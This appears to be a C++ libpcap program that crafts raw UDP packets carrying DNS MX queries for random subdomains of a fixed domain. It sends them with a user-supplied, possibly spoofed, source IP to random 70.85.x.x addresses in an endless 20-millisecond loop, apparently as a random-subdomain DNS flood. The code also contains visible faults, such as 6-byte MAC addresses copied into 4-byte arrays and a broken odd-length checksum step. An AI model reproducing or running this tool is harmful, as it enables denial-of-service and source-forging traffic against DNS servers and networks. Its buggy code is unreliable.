#include <stdlib.h>
#include <math.h>
#include <memory.h>
#include <iostream>
#include <pcap.h>

using namespace std;

unsigned short cksum(unsigned char* buf, int len)
{
	long sum = 0;
	while(len > 1)
	{
		sum += *(unsigned short*)buf;
		buf += 2;
		if(sum & 0x80000000)
			sum = (sum & 0xffff) + (sum >> 16);
		len -= 2;
	}
	if(len)
		sum = (unsigned short)*buf;
	while(sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return ~sum;
}

void genPktLnHead(unsigned char* buf, const unsigned char* srcMac, const unsigned char* destMac)
{
	memcpy(buf, destMac, 6);
	memcpy(buf + 6, srcMac, 6);
	memcpy(buf + 12, "\x08", 2);
}

void genPktIpHead(unsigned char* buf, const unsigned char* srcIp, const unsigned char* destIp)
{
	memcpy(buf + 14, "\x45\x00\x00\x7b", 4);
	unsigned short id = rand() + rand();
	memcpy(buf + 18, &id, 2);
	memcpy(buf + 20, "\x00\x00\x80\x11\x00", 6);
	memcpy(buf + 26, srcIp, 4);
	memcpy(buf + 30, destIp, 4);
	unsigned short sum = cksum(buf + 14, 30 + 4 - 14);
	memcpy(buf + 24, &sum, 2);
}

unsigned char randChr()
{
	char chrs[] = "0123456789abcdefghijklmnopqrstuvwxyz";
	return chrs[rand() % (sizeof(chrs) - 1)];
}

void genPktUdpHead(unsigned char* buf)
{
	unsigned short srcPort = rand() + rand();
	memcpy(buf + 34, &srcPort, 2);
	memcpy(buf + 36, "\x00\x35\x00\x67\x00", 6);

	//domain
	unsigned short transId =rand() + rand();
	memcpy(buf + 42, &transId, 2);
	memcpy(buf + 44, "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x1e", 11);
	for(int i = 0; i < 30; i++)
		buf[55 + i] = randChr();
	buf[85] = (char) 31;
	for(int i = 0; i < 31; i++)
		buf[86 + i] = randChr();
	memcpy(buf + 117, "\x02\x37\x31\x07nsk3fxb\x03\x63om\x00\x00\x0f\x00\x01\x00\x00\x11\x00\x67", 25);
	unsigned short sum = cksum(buf + 26, 117 + 25 - 26);
	memcpy(buf + 40, &sum, 2);
}

int genPkt(unsigned char* buf, const unsigned char* srcMac, const unsigned char* destMac, const unsigned char* srcIp, const unsigned char* destIp)
{
	genPktLnHead(buf, srcMac, destMac);
	genPktIpHead(buf, srcIp, destIp);
	genPktUdpHead(buf);
	return 137;
}

void genRndDestIp(unsigned char* destIp)
{
	memcpy(destIp, "\x46\x55", 2);
	unsigned short rndPartIp = rand() + rand();
	memcpy(destIp + 2, &rndPartIp, 2);
}

unsigned char hex2bin(unsigned char h)
{
	if(h >= '0' && h <= '9')
		return h - '0';
	if(h >= 'A' && h <= 'F')
		return h - 'A' + 10;
	if(h >= 'a' && h <= 'f')
		return h - 'a' + 10;
	return 0xff;
}

void textMac2BinMac(const char* textMac, unsigned char* binMac)
{
	for(int i = 0; i < 6; i++)
		binMac[i] = (hex2bin(textMac[i * 3]) << 4) | hex2bin(textMac[i * 3 + 1]);
}

int main(int argc, char* argv[])
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t *alldevs;
	if(pcap_findalldevs(&alldevs, errbuf) != 0)
	{
		cout << "pcap_findalldevs error: " << errbuf << endl;
		return 1;
	}
	pcap_t *dev;
	{
		pcap_if_t *pcap_dev = alldevs;
		int i = 1;
		for(; pcap_dev != NULL; pcap_dev = pcap_dev->next, ++i)
			cerr << i << ". " << pcap_dev->name << ": " << pcap_dev->description << endl;
		cout << "Select: " << flush;
		int n;
		cin >> n;
		i = 1;
		pcap_dev = alldevs;
		for(; pcap_dev != NULL && i != n; pcap_dev = pcap_dev->next, ++i);
		if(pcap_dev == NULL)
		{
			cerr << "Select error: " << n << endl;
			return 2;
		}
		dev = pcap_open_live(pcap_dev->name, 65535, 0, 0, errbuf);
		if(dev == NULL)
		{
			cout << "pcap_open_live error: " << errbuf << endl;
			return 3;
		}
	}
	unsigned char binSrcMac[4], binDestMac[4], binSrcIp[4], binDestIp[4], buf[256];
	textMac2BinMac(argv[2], binSrcMac);
	textMac2BinMac(argv[3], binDestMac);
	*(unsigned int *)binSrcIp = inet_addr(argv[4]);
	srand(time(NULL));
	if(argv[1][0] == 'i')
	{
		while(true)
		{
			genRndDestIp(binDestIp);
			int len = genPkt(buf, binSrcMac, binDestMac, binSrcIp, binDestIp);
			pcap_sendpacket(dev, buf, len);
			Sleep(20);
		}
	}
	else if(argv[1][0] == 'p')
	{
		while(true)
		{
			//TODO:
		}
	}
	return 0;
}
